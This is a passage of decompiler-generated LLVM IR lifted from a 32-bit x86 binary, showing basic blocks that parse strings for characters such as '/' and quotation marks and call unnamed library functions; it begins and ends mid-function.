  %v1_80499c0 = add i32 %v0_80499c0, 16
  %v6_80499c0 = icmp eq i32 %v1_80499c0, 0
  store i1 %v6_80499c0, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80499c3

dec_label_pc_80499c3:                             ; preds = %dec_label_pc_804994e, %dec_label_pc_8049982
  %v1_8049ef8 = phi i32 [ %v1_804997c, %dec_label_pc_804994e ], [ %v1_80499c0, %dec_label_pc_8049982 ]
  %v1_80499c3 = add i32 %v1_8049ef8, 20900
  %v2_80499c3 = inttoptr i32 %v1_80499c3 to i32*
  %v3_80499c3 = load i32, i32* %v2_80499c3, align 4
  store i32 %v3_80499c3, i32* %eax.global-to-local, align 4
  %v0_80499ca = load i32, i32* @esi, align 4
  %v2_80499ca = add i32 %v0_80499ca, %v3_80499c3
  %v3_80499ca = inttoptr i32 %v2_80499ca to i8*
  %v4_80499ca = load i8, i8* %v3_80499ca, align 1
  %v13_80499ca = icmp eq i8 %v4_80499ca, 34
  store i1 %v13_80499ca, i1* %zf.global-to-local, align 1
  br i1 %v13_80499ca, label %dec_label_pc_8049ef5, label %dec_label_pc_80499d4

dec_label_pc_80499d4:                             ; preds = %dec_label_pc_8049ef5, %dec_label_pc_80499c3, %dec_label_pc_8049f19
  %v1_80499d4 = phi i32 [ %v1_8049f0b, %dec_label_pc_8049ef5 ], [ %v1_8049ef8, %dec_label_pc_80499c3 ], [ %v1_80499d4.pre, %dec_label_pc_8049f19 ]
  %v0_80499d4 = phi i32 [ %v2_8049f06, %dec_label_pc_8049ef5 ], [ %v3_80499c3, %dec_label_pc_80499c3 ], [ %v0_80499d4.pre, %dec_label_pc_8049f19 ]
  %v2_80499d4 = add i32 %v1_80499d4, -4
  %v3_80499d4 = inttoptr i32 %v2_80499d4 to i32*
  store i32 %v0_80499d4, i32* %v3_80499d4, align 4
  %v0_80499d5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80499d5 = add i32 %v1_80499d4, -8
  %v3_80499d5 = inttoptr i32 %v2_80499d5 to i32*
  store i32 %v0_80499d5, i32* %v3_80499d5, align 4
  %v1_80499d6 = add i32 %v1_80499d4, -12
  %v2_80499d6 = inttoptr i32 %v1_80499d6 to i32*
  store i32 10, i32* %v2_80499d6, align 4
  %v0_80499d8 = load i32, i32* @esi, align 4
  %v2_80499d8 = add i32 %v1_80499d4, -16
  %v3_80499d8 = inttoptr i32 %v2_80499d8 to i32*
  store i32 %v0_80499d8, i32* %v3_80499d8, align 4
  %v3_80499d9 = call i32 @function_8052720(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  %v0_80499de = load i32, i32* @esp, align 4
  %v1_80499de = add i32 %v0_80499de, 16
  store i32 %v3_80499d9, i32* %edx.global-to-local, align 4
  %v1_80499e3 = add i32 %v3_80499d9, -1
  store i32 %v1_80499e3, i32* %eax.global-to-local, align 4
  %v9_80499e6 = icmp eq i32 %v3_80499d9, 9
  store i1 %v9_80499e6, i1* %zf.global-to-local, align 1
  %v6_80499e9 = icmp ugt i32 %v1_80499e3, 8
  br i1 %v6_80499e9, label %dec_label_pc_8049a11, label %dec_label_pc_80499eb

dec_label_pc_80499eb:                             ; preds = %dec_label_pc_80499d4
  %v1_80499eb = add i32 %v0_80499de, 132
  %v2_80499eb = inttoptr i32 %v1_80499eb to i32*
  %v3_80499eb = load i32, i32* %v2_80499eb, align 4
  %v2_80499ef = add i32 %v3_80499eb, %v3_80499d9
  store i32 %v2_80499ef, i32* @ebx, align 4
  %v9_8049a00185 = icmp eq i32 %v1_80499de, 12
  store i1 %v9_8049a00185, i1* %zf.global-to-local, align 1
  %v2_8049a03187 = inttoptr i32 %v0_80499de to i32*
  store i32 0, i32* %v2_8049a03187, align 4
  %v2_8049a05188 = call i32 @function_8052e82(i32* %v1_80484ea)
  store i32 %v2_8049a05188, i32* %eax.global-to-local, align 4
  %v0_8049a0a189 = load i32, i32* @esp, align 4
  %v1_8049a0a190 = add i32 %v0_8049a0a189, 16
  %v1_8049a0d191 = load i32, i32* @ebx, align 4
  %v7_8049a0d192 = icmp ult i32 %v2_8049a05188, %v1_8049a0d191
  %v12_8049a0d193 = icmp eq i32 %v2_8049a05188, %v1_8049a0d191
  store i1 %v12_8049a0d193, i1* %zf.global-to-local, align 1
  br i1 %v7_8049a0d192, label %dec_label_pc_80499f3, label %dec_label_pc_8049a11

dec_label_pc_80499f3:                             ; preds = %dec_label_pc_80499eb, %dec_label_pc_80499f3
  %v0_8049a0a194 = phi i32 [ %v0_8049a0a, %dec_label_pc_80499f3 ], [ %v0_8049a0a189, %dec_label_pc_80499eb ]
  %v9_80499f3 = icmp eq i32 %v0_8049a0a194, -4
  store i1 %v9_80499f3, i1* %zf.global-to-local, align 1
  %v2_80499f6 = inttoptr i32 %v0_8049a0a194 to i32*
  store i32 1, i32* %v2_80499f6, align 4
  %v1_80499f8 = call i32 @function_8054770(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80499f8, i32* %eax.global-to-local, align 4
  %v0_80499fd = load i32, i32* @esp, align 4
  %v9_8049a00 = icmp eq i32 %v0_80499fd, -4
  store i1 %v9_8049a00, i1* %zf.global-to-local, align 1
  %v2_8049a03 = inttoptr i32 %v0_80499fd to i32*
  store i32 0, i32* %v2_8049a03, align 4
  %v2_8049a05 = call i32 @function_8052e82(i32* %v1_80484ea)
  store i32 %v2_8049a05, i32* %eax.global-to-local, align 4
  %v0_8049a0a = load i32, i32* @esp, align 4
  %v1_8049a0a = add i32 %v0_8049a0a, 16
  %v1_8049a0d = load i32, i32* @ebx, align 4
  %v7_8049a0d = icmp ult i32 %v2_8049a05, %v1_8049a0d
  %v12_8049a0d = icmp eq i32 %v2_8049a05, %v1_8049a0d
  store i1 %v12_8049a0d, i1* %zf.global-to-local, align 1
  br i1 %v7_8049a0d, label %dec_label_pc_80499f3, label %dec_label_pc_8049a11

dec_label_pc_8049a11:                             ; preds = %dec_label_pc_80499eb, %dec_label_pc_80499f3, %dec_label_pc_80499d4
  %v0_8049a1a = phi i32 [ %v1_80499de, %dec_label_pc_80499d4 ], [ %v1_8049a0a190, %dec_label_pc_80499eb ], [ %v1_8049a0a, %dec_label_pc_80499f3 ]
  %v1_8049a11 = add i32 %v0_8049a1a, 20900
  %v2_8049a11 = inttoptr i32 %v1_8049a11 to i32*
  %v3_8049a11 = load i32, i32* %v2_8049a11, align 4
  store i32 %v3_8049a11, i32* %eax.global-to-local, align 4
  %v0_8049a18 = load i32, i32* @esi, align 4
  %v2_8049a1d = add i32 %v0_8049a18, %v3_8049a11
  %v12_8049a1d = icmp eq i32 %v2_8049a1d, 0
  store i1 %v12_8049a1d, i1* %zf.global-to-local, align 1
  store i32 %v2_8049a1d, i32* @ebx, align 4
  %v2_8049a1f = add i32 %v0_8049a1a, -16
  %v3_8049a1f = inttoptr i32 %v2_8049a1f to i32*
  store i32 %v2_8049a1d, i32* %v3_8049a1f, align 4
  %v2_8049a20 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049a20, i32* %eax.global-to-local, align 4
  %v0_8049a25 = load i32, i32* @esp, align 4
  %v9_8049a25 = icmp eq i32 %v0_8049a25, -12
  store i1 %v9_8049a25, i1* %zf.global-to-local, align 1
  %v1_8049a28 = add i32 %v0_8049a25, 8
  %v2_8049a28 = inttoptr i32 %v1_8049a28 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80554eb.15 to i32), i32* %v2_8049a28, align 4
  %v2_8049a2d = add i32 %v0_8049a25, 4
  %v3_8049a2d = inttoptr i32 %v2_8049a2d to i32*
  store i32 %v2_8049a20, i32* %v3_8049a2d, align 4
  %v0_8049a2e = load i32, i32* @ebx, align 4
  %v3_8049a2e = inttoptr i32 %v0_8049a25 to i32*
  store i32 %v0_8049a2e, i32* %v3_8049a2e, align 4
  %v4_8049a2f = call i32 @function_8052910(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049a2f, i32* %eax.global-to-local, align 4
  %v0_8049a34 = load i32, i32* @esp, align 4
  %v1_8049a34 = add i32 %v0_8049a34, 16
  %v9_8049a37 = icmp eq i32 %v4_8049a2f, 4
  store i1 %v9_8049a37, i1* %zf.global-to-local, align 1
  br i1 %v9_8049a37, label %dec_label_pc_8049e6a, label %dec_label_pc_8049a40

dec_label_pc_8049a40:                             ; preds = %dec_label_pc_8049a11
  %v0_8049a40 = load i32, i32* @ebx, align 4
  %v1_8049a40 = inttoptr i32 %v0_8049a40 to i8*
  %v2_8049a40 = load i8, i8* %v1_8049a40, align 1
  %v11_8049a40 = icmp eq i8 %v2_8049a40, 47
  store i1 %v11_8049a40, i1* %zf.global-to-local, align 1
  br i1 %v11_8049a40, label %dec_label_pc_8049d1e, label %dec_label_pc_8049a49

dec_label_pc_8049a49:                             ; preds = %dec_label_pc_8049d41, %dec_label_pc_8049d1e, %dec_label_pc_8049a40, %dec_label_pc_8049d76
  %v0_8049a49 = phi i32 [ %v1_8049d6b, %dec_label_pc_8049d41 ], [ %v1_8049d33, %dec_label_pc_8049d1e ], [ %v1_8049a34, %dec_label_pc_8049a40 ], [ %v1_8049d8b, %dec_label_pc_8049d76 ]
  %v1_8049a49 = add i32 %v0_8049a49, 76
  %v2_8049a49 = inttoptr i32 %v1_8049a49 to i32*
  %v3_8049a49 = load i32, i32* %v2_8049a49, align 4
  store i32 %v3_8049a49, i32* %edx.global-to-local, align 4
  %v1_8049a4d = add i32 %v3_8049a49, 1431
  %v2_8049a4d = inttoptr i32 %v1_8049a4d to i32*
  store i32 5522759, i32* %v2_8049a4d, align 4
  %v0_8049a57 = load i32, i32* @esp, align 4
  %v1_8049a57 = add i32 %v0_8049a57, 92
  %v2_8049a57 = inttoptr i32 %v1_8049a57 to i32*
  %v3_8049a57 = load i32, i32* %v2_8049a57, align 4
  store i32 %v3_8049a57, i32* %ecx.global-to-local, align 4
  %v1_8049a5b = add i32 %v3_8049a57, -1448
  %v2_8049a5b = inttoptr i32 %v1_8049a5b to i8*
  store i8 10, i8* %v2_8049a5b, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049a67:                             ; preds = %dec_label_pc_8049124
  %v1_8049a67 = add i32 %v0_8049145, 108
  %v2_8049a67 = inttoptr i32 %v1_8049a67 to i32*
  %v3_8049a67 = load i32, i32* %v2_8049a67, align 4
  store i32 %v3_8049a67, i32* %eax.global-to-local, align 4
  %v1_8049a6b = add i32 %v3_8049a67, 12
  %v2_8049a6b = inttoptr i32 %v1_8049a6b to i32*
  store i32 0, i32* %v2_8049a6b, align 4
  br label %dec_label_pc_80491db

dec_label_pc_8049a77:                             ; preds = %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge, %dec_label_pc_804987f, %dec_label_pc_8049854
  %v0_8049a77 = phi i32 [ %v0_8049a77.pre, %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge ], [ %v1_80498d4, %dec_label_pc_804987f ], [ %v1_8049875, %dec_label_pc_8049854 ]
  %v1_8049a77 = add i32 %v0_8049a77, -4
  %v2_8049a77 = inttoptr i32 %v1_8049a77 to i32*
  store i32 4, i32* %v2_8049a77, align 4
  %v1_8049a79 = add i32 %v0_8049a77, -8
  %v2_8049a79 = inttoptr i32 %v1_8049a79 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80554e4.13 to i32), i32* %v2_8049a79, align 4
  %v1_8049a7e = add i32 %v0_8049a77, 104
  %v2_8049a7e = inttoptr i32 %v1_8049a7e to i32*
  %v3_8049a7e = load i32, i32* %v2_8049a7e, align 4
  store i32 %v3_8049a7e, i32* %ecx.global-to-local, align 4
  %v2_8049a82 = add i32 %v0_8049a77, -12
  %v3_8049a82 = inttoptr i32 %v2_8049a82 to i32*
  store i32 %v3_8049a7e, i32* %v3_8049a82, align 4
  %v1_8049a83 = add i32 %v0_8049a77, 131
  store i32 %v1_8049a83, i32* %eax.global-to-local, align 4
  %v2_8049a8a = add i32 %v0_8049a77, -16
  %v3_8049a8a = inttoptr i32 %v2_8049a8a to i32*
  store i32 %v1_8049a83, i32* %v3_8049a8a, align 4
  %v0_8049a8b = call i32 @function_80526d0()
  store i32 %v0_8049a8b, i32* %eax.global-to-local, align 4
  %v0_8049a90 = load i32, i32* @esp, align 4
  %v1_8049a90 = add i32 %v0_8049a90, 92
  %v2_8049a90 = inttoptr i32 %v1_8049a90 to i32*
  %v3_8049a90 = load i32, i32* %v2_8049a90, align 4
  store i32 %v0_8049a8b, i32* @esi, align 4
  %v1_8049a96 = add i32 %v3_8049a90, 1431
  %v9_8049a96 = icmp eq i32 %v1_8049a96, 0
  store i1 %v9_8049a96, i1* %zf.global-to-local, align 1
  store i32 %v1_8049a96, i32* @ebx, align 4
  %v1_8049a9c = inttoptr i32 %v0_8049a90 to i32*
  %v2_8049a9c = load i32, i32* %v1_8049a9c, align 4
  store i32 %v2_8049a9c, i32* %eax.global-to-local, align 4
  %v3_8049a9c = add i32 %v0_8049a90, 4
  %v1_8049a9d = inttoptr i32 %v3_8049a9c to i32*
  %v2_8049a9d = load i32, i32* %v1_8049a9d, align 4
  store i32 %v2_8049a9d, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80554f5.18 to i32), i32* %v1_8049a9d, align 4
  %v0_8049aa3 = load i32, i32* @ebx, align 4
  store i32 %v0_8049aa3, i32* %v1_8049a9c, align 4
  %v0_8049aa4 = call i32 @function_8052990()
  store i32 %v0_8049aa4, i32* %eax.global-to-local, align 4
  %v0_8049aa9 = load i32, i32* @esp, align 4
  %v3_8049aac = trunc i32 %v0_8049aa4 to i8
  %v4_8049aac = icmp eq i8 %v3_8049aac, 0
  store i1 %v4_8049aac, i1* %zf.global-to-local, align 1
  br i1 %v4_8049aac, label %dec_label_pc_8049c4e, label %dec_label_pc_8049ab4

dec_label_pc_8049ab4:                             ; preds = %dec_label_pc_8049c4e, %dec_label_pc_8049a77
  %v0_8049ab4.in = phi i32 [ %v0_8049c5b, %dec_label_pc_8049c4e ], [ %v0_8049aa9, %dec_label_pc_8049a77 ]
  %v1_8049ab4 = add i32 %v0_8049ab4.in, 108
  %v2_8049ab4 = inttoptr i32 %v1_8049ab4 to i32*
  %v3_8049ab4 = load i32, i32* %v2_8049ab4, align 4
  store i32 %v3_8049ab4, i32* %edx.global-to-local, align 4
  %v1_8049ab8 = add i32 %v3_8049ab4, -1448
  %v2_8049ab8 = inttoptr i32 %v1_8049ab8 to i8*
  store i8 7, i8* %v2_8049ab8, align 1
  br label %dec_label_pc_8049abf

dec_label_pc_8049abf:                             ; preds = %dec_label_pc_8049c66, %dec_label_pc_8049ab4
  %v0_8049abf = load i32, i32* @esp, align 4
  %v1_8049abf = add i32 %v0_8049abf, -4
  %v2_8049abf = inttoptr i32 %v1_8049abf to i32*
  store i32 16384, i32* %v2_8049abf, align 4
  %v0_8049ac4 = load i32, i32* @esi, align 4
  %v2_8049ac4 = add i32 %v0_8049abf, -8
  %v3_8049ac4 = inttoptr i32 %v2_8049ac4 to i32*
  store i32 %v0_8049ac4, i32* %v3_8049ac4, align 4
  %v1_8049ac5 = add i32 %v0_8049abf, 131
  store i32 %v1_8049ac5, i32* %eax.global-to-local, align 4
  %v2_8049acc = add i32 %v0_8049abf, -12
  %v3_8049acc = inttoptr i32 %v2_8049acc to i32*
  store i32 %v1_8049ac5, i32* %v3_8049acc, align 4
  %v1_8049acd = add i32 %v0_8049abf, 92
  %v2_8049acd = inttoptr i32 %v1_8049acd to i32*
  %v3_8049acd = load i32, i32* %v2_8049acd, align 4
  store i32 %v3_8049acd, i32* %edx.global-to-local, align 4
  %v1_8049ad1 = add i32 %v3_8049acd, -1452
  %v2_8049ad1 = inttoptr i32 %v1_8049ad1 to i32*
  %v3_8049ad1 = load i32, i32* %v2_8049ad1, align 4
  store i32 %v3_8049ad1, i32* %eax.global-to-local, align 4
  %v2_8049ad7 = add i32 %v0_8049abf, -16
  %v3_8049ad7 = inttoptr i32 %v2_8049ad7 to i32*
  store i32 %v3_8049ad1, i32* %v3_8049ad7, align 4
  %v0_8049ad8 = call i32 @function_805328e()
  store i32 %v0_8049ad8, i32* %eax.global-to-local, align 4
  %v0_8049add = load i32, i32* @esp, align 4
  %v6_8049add = icmp eq i32 %v0_8049add, -16
  store i1 %v6_8049add, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049ae5:                             ; preds = %dec_label_pc_8048ebe
  %v3_8049ae5 = load i32, i32* %v2_8049ae5, align 4
  %v4_8049ae5 = add i32 %v3_8049ae5, -10239
  %v9_8049ae5 = sub i32 10238, %v3_8049ae5
  %v10_8049ae5 = and i32 %v9_8049ae5, %v3_8049ae5
  %v11_8049ae5 = icmp slt i32 %v10_8049ae5, 0
  %v12_8049ae5 = icmp eq i32 %v4_8049ae5, 0
  store i1 %v12_8049ae5, i1* %zf.global-to-local, align 1
  %v13_8049ae5 = icmp slt i32 %v4_8049ae5, 0
  %v3_8049aed = icmp ne i1 %v13_8049ae5, %v11_8049ae5
  %v4_8049aed = or i1 %v12_8049ae5, %v3_8049aed
  br i1 %v4_8049aed, label %dec_label_pc_8048d91, label %dec_label_pc_8048ee1

dec_label_pc_8049af8:                             ; preds = %dec_label_pc_8049577
  %v0_8049af8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049af8 = add i32 %v0_8049af8, -1448
  %v2_8049af8 = inttoptr i32 %v1_8049af8 to i8*
  store i8 1, i8* %v2_8049af8, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049b04:                             ; preds = %dec_label_pc_80497ba
  %v0_8049b04 = load i32, i32* @ebx, align 4
  %v1_8049b04 = inttoptr i32 %v0_8049b04 to i32*
  store i32 104, i32* %v1_8049b04, align 4
  %v0_80497f9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80497f9

dec_label_pc_8049b0f:                             ; preds = %dec_label_pc_8049518
  %v0_8049b0f = load i32, i32* @edi, align 4
  %v1_8049b0f = inttoptr i32 %v0_8049b0f to i32*
  %v2_8049b0f = load i32, i32* %v1_8049b0f, align 4
  %v11_8049b0f = icmp eq i32 %v2_8049b0f, 11
  store i1 %v11_8049b0f, i1* %zf.global-to-local, align 1
  %v1_8049b12 = icmp eq i1 %v11_8049b0f, false
  br i1 %v1_8049b12, label %dec_label_pc_8048e4a, label %dec_label_pc_8048d91

dec_label_pc_8049b1d:                             ; preds = %dec_label_pc_8049468
  %v1_8049b1d = add i32 %v0_804948a, 20916
  %v2_8049b1d = inttoptr i32 %v1_8049b1d to i32*
  store i32 7, i32* %v2_8049b1d, align 4
  %v0_8049b28 = load i32, i32* @esi, align 4
  %v1_8049b28 = add i32 %v0_8049b28, 4
  %v2_8049b28 = inttoptr i32 %v1_8049b28 to i8*
  %v3_8049b28 = load i8, i8* %v2_8049b28, align 1
  %v12_8049b28 = icmp eq i8 %v3_8049b28, 115
  store i1 %v12_8049b28, i1* %zf.global-to-local, align 1
  br i1 %v12_8049b28, label %dec_label_pc_8049d93, label %dec_label_pc_8049b32

dec_label_pc_8049b32:                             ; preds = %dec_label_pc_8049b1d, %dec_label_pc_8049d93
  %v0_8049b32 = load i32, i32* @esp, align 4
  %v1_8049b32 = add i32 %v0_8049b32, 20900
  %v2_8049b32 = inttoptr i32 %v1_8049b32 to i32*
  %v3_8049b32 = load i32, i32* %v2_8049b32, align 4
  store i32 %v3_8049b32, i32* %eax.global-to-local, align 4
  %v0_8049b39 = load i32, i32* @edx, align 4
  %v2_8049b39 = add i32 %v0_8049b32, -4
  %v3_8049b39 = inttoptr i32 %v2_8049b39 to i32*
  store i32 %v0_8049b39, i32* %v3_8049b39, align 4
  %v0_8049b3a = load i32, i32* @ebx, align 4
  %v1_8049b3a = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b3a = sub i32 %v0_8049b3a, %v1_8049b3a
  %v12_8049b3a = icmp eq i32 %v2_8049b3a, 0
  store i1 %v12_8049b3a, i1* %zf.global-to-local, align 1
  store i32 %v2_8049b3a, i32* @ebx, align 4
  %v0_8049b3c = load i32, i32* @esi, align 4
  %v2_8049b3c = add i32 %v0_8049b3c, %v1_8049b3a
  store i32 %v2_8049b3c, i32* %eax.global-to-local, align 4
  %v2_8049b3f = add i32 %v0_8049b32, -8
  %v3_8049b3f = inttoptr i32 %v2_8049b3f to i32*
  store i32 %v2_8049b3a, i32* %v3_8049b3f, align 4
  %v0_8049b40 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b40 = add i32 %v0_8049b32, -12
  %v3_8049b40 = inttoptr i32 %v2_8049b40 to i32*
  store i32 %v0_8049b40, i32* %v3_8049b40, align 4
  %v0_8049b41 = load i32, i32* @esi, align 4
  %v2_8049b41 = add i32 %v0_8049b32, -16
  %v3_8049b41 = inttoptr i32 %v2_8049b41 to i32*
  store i32 %v0_8049b41, i32* %v3_8049b41, align 4
  %v4_8049b42 = call i32 @function_8053123(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049b42, i32* %eax.global-to-local, align 4
  %v0_8049b47 = load i32, i32* @esp, align 4
  %v1_8049b47 = add i32 %v0_8049b47, 20916
  %v2_8049b47 = inttoptr i32 %v1_8049b47 to i32*
  store i32 0, i32* %v2_8049b47, align 4
  %v0_8049b52 = load i32, i32* @esi, align 4
  %v1_8049b52 = inttoptr i32 %v0_8049b52 to i8*
  %v2_8049b52 = load i8, i8* %v1_8049b52, align 1
  %v3_8049b52 = zext i8 %v2_8049b52 to i32
  %v5_8049b52 = and i32 %v4_8049b42, -256
  %v6_8049b52 = or i32 %v3_8049b52, %v5_8049b52
  store i32 %v6_8049b52, i32* %eax.global-to-local, align 4
  %v0_8049b54 = load i32, i32* @esp, align 4
  %v4_8049b57 = icmp eq i8 %v2_8049b52, 0
  store i1 %v4_8049b57, i1* %zf.global-to-local, align 1
  br i1 %v4_8049b57, label %dec_label_pc_8049b86, label %dec_label_pc_8049b5b

dec_label_pc_8049b5b:                             ; preds = %dec_label_pc_8049b32
  store i32 %v0_8049b52, i32* %ecx.global-to-local, align 4
  %v10_8049b5d = icmp eq i8 %v2_8049b52, 47
  store i1 %v10_8049b5d, i1* %zf.global-to-local, align 1
  br i1 %v10_8049b5d, label %dec_label_pc_8049c80, label %dec_label_pc_8049b65

dec_label_pc_8049b65:                             ; preds = %dec_label_pc_8049b5b
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8049b76171 = add i32 %v0_8049b52, 1
  store i32 %v2_8049b76171, i32* %ecx.global-to-local, align 4
  %v2_8049b79172 = add i32 %v0_8049b54, 20916
  %v3_8049b79173 = inttoptr i32 %v2_8049b79172 to i32*
  store i32 1, i32* %v3_8049b79173, align 4
  %v0_8049b80174 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049b80175 = inttoptr i32 %v0_8049b80174 to i8*
  %v2_8049b80176 = load i8, i8* %v1_8049b80175, align 1
  %v3_8049b80177 = zext i8 %v2_8049b80176 to i32
  %v4_8049b80178 = load i32, i32* @edx, align 4
  %v5_8049b80179 = and i32 %v4_8049b80178, -256
  %v6_8049b80180 = or i32 %v5_8049b80179, %v3_8049b80177
  store i32 %v6_8049b80180, i32* %edx.global-to-local, align 4
  %v4_8049b82181 = icmp eq i8 %v2_8049b80176, 0
  store i1 %v4_8049b82181, i1* %zf.global-to-local, align 1
  %v1_8049b84182 = icmp eq i1 %v4_8049b82181, false
  br i1 %v1_8049b84182, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b86

dec_label_pc_8049b6c:                             ; preds = %dec_label_pc_8049b65, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge
  %v2_8049b80184 = phi i8 [ %v2_8049b80, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge ], [ %v2_8049b80176, %dec_label_pc_8049b65 ]
  %v0_8049b80183 = phi i32 [ %v0_8049b80, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge ], [ %v0_8049b80174, %dec_label_pc_8049b65 ]
  %v0_8049b6c = load i32, i32* %eax.global-to-local, align 4
  %v1_8049b6c = add i32 %v0_8049b6c, 1
  store i32 %v1_8049b6c, i32* %eax.global-to-local, align 4
  %v10_8049b6d = icmp eq i8 %v2_8049b80184, 47
  store i1 %v10_8049b6d, i1* %zf.global-to-local, align 1
  br i1 %v10_8049b6d, label %dec_label_pc_8049c80, label %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge

dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge: ; preds = %dec_label_pc_8049b6c
  %v1_8049b76.pre = load i32, i32* @esi, align 4
  %v1_8049b79.pre = load i32, i32* @esp, align 4
  %v2_8049b76 = add i32 %v1_8049b6c, %v1_8049b76.pre
  store i32 %v2_8049b76, i32* %ecx.global-to-local, align 4
  %v2_8049b79 = add i32 %v1_8049b79.pre, 20900
  %v3_8049b79 = inttoptr i32 %v2_8049b79 to i32*
  store i32 %v1_8049b6c, i32* %v3_8049b79, align 4
  %v0_8049b80 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049b80 = inttoptr i32 %v0_8049b80 to i8*
  %v2_8049b80 = load i8, i8* %v1_8049b80, align 1
  %v3_8049b80 = zext i8 %v2_8049b80 to i32
  %v4_8049b80 = load i32, i32* %edx.global-to-local, align 4
  %v5_8049b80 = and i32 %v4_8049b80, -256
  %v6_8049b80 = or i32 %v5_8049b80, %v3_8049b80
  store i32 %v6_8049b80, i32* %edx.global-to-local, align 4
  %v4_8049b82 = icmp eq i8 %v2_8049b80, 0
  store i1 %v4_8049b82, i1* %zf.global-to-local, align 1
  %v1_8049b84 = icmp eq i1 %v4_8049b82, false
  br i1 %v1_8049b84, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b86

dec_label_pc_8049b86:                             ; preds = %dec_label_pc_8049b65, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge, %dec_label_pc_8049b32, %dec_label_pc_8049c80
  %v0_8049b86 = load i32, i32* @esp, align 4
  %v9_8049b86 = icmp eq i32 %v0_8049b86, 12
  store i1 %v9_8049b86, i1* %zf.global-to-local, align 1
  %v0_8049b89 = load i32, i32* @esi, align 4
  %v2_8049b89 = add i32 %v0_8049b86, -16
  %v3_8049b89 = inttoptr i32 %v2_8049b89 to i32*
  store i32 %v0_8049b89, i32* %v3_8049b89, align 4
  %v2_8049b8a = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049b8a, i32* %eax.global-to-local, align 4
  %v0_8049b8f = load i32, i32* @esp, align 4
  %v1_8049b8f = add i32 %v0_8049b8f, 16
  %v1_8049b92 = icmp eq i32 %v2_8049b8a, 0
  store i1 %v1_8049b92, i1* %zf.global-to-local, align 1
  %tmp147 = icmp slt i32 %v2_8049b8a, 1
  br i1 %tmp147, label %dec_label_pc_8049bbc, label %dec_label_pc_8049b96

dec_label_pc_8049b96:                             ; preds = %dec_label_pc_8049b86
  %v9_8049b96 = icmp eq i32 %v0_8049b8f, -4
  store i1 %v9_8049b96, i1* %zf.global-to-local, align 1
  %v0_8049b99 = load i32, i32* @esi, align 4
  %v3_8049b99 = inttoptr i32 %v0_8049b8f to i32*
  store i32 %v0_8049b99, i32* %v3_8049b99, align 4
  %v2_8049b9a = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8049b9a, i32* %eax.global-to-local, align 4
  %v0_8049b9f = load i32, i32* @esp, align 4
  %v1_8049b9f = add i32 %v0_8049b9f, 16
  %v1_8049ba2 = add i32 %v2_8049b9a, -127
  %v6_8049ba2 = sub i32 126, %v2_8049b9a
  %v7_8049ba2 = and i32 %v6_8049ba2, %v2_8049b9a
  %v8_8049ba2 = icmp slt i32 %v7_8049ba2, 0
  %v9_8049ba2 = icmp eq i32 %v1_8049ba2, 0
  store i1 %v9_8049ba2, i1* %zf.global-to-local, align 1
  %v10_8049ba2 = icmp slt i32 %v1_8049ba2, 0
  %v3_8049ba5 = icmp eq i1 %v10_8049ba2, %v8_8049ba2
  %v4_8049ba5 = icmp eq i1 %v9_8049ba2, false
  %v5_8049ba5 = and i1 %v4_8049ba5, %v3_8049ba5
  br i1 %v5_8049ba5, label %dec_label_pc_8049bbc, label %dec_label_pc_8049ba7

dec_label_pc_8049ba7:                             ; preds = %dec_label_pc_8049b96
  %v2_8049ba7 = add i32 %v0_8049b9f, 12
  %v3_8049ba7 = inttoptr i32 %v2_8049ba7 to i32*
  store i32 %v2_8049b9a, i32* %v3_8049ba7, align 4
  %v2_8049ba8 = add i32 %v0_8049b9f, 8
  %v3_8049ba8 = inttoptr i32 %v2_8049ba8 to i32*
  store i32 %v2_8049b9a, i32* %v3_8049ba8, align 4
  %v0_8049ba9 = load i32, i32* @esi, align 4
  %v2_8049ba9 = add i32 %v0_8049b9f, 4
  %v3_8049ba9 = inttoptr i32 %v2_8049ba9 to i32*
  store i32 %v0_8049ba9, i32* %v3_8049ba9, align 4
  %v1_8049baa = add i32 %v0_8049b9f, 92
  %v2_8049baa = inttoptr i32 %v1_8049baa to i32*
  %v3_8049baa = load i32, i32* %v2_8049baa, align 4
  %v1_8049bae = add i32 %v3_8049baa, 789
  %v9_8049bae = icmp eq i32 %v1_8049bae, 0
  store i1 %v9_8049bae, i1* %zf.global-to-local, align 1
  store i32 %v1_8049bae, i32* %eax.global-to-local, align 4
  %v3_8049bb3 = inttoptr i32 %v0_8049b9f to i32*
  store i32 %v1_8049bae, i32* %v3_8049bb3, align 4
  %v3_8049bb4 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049bb4, i32* %eax.global-to-local, align 4
  %v0_8049bb9 = load i32, i32* @esp, align 4
  %v1_8049bb9 = add i32 %v0_8049bb9, 16
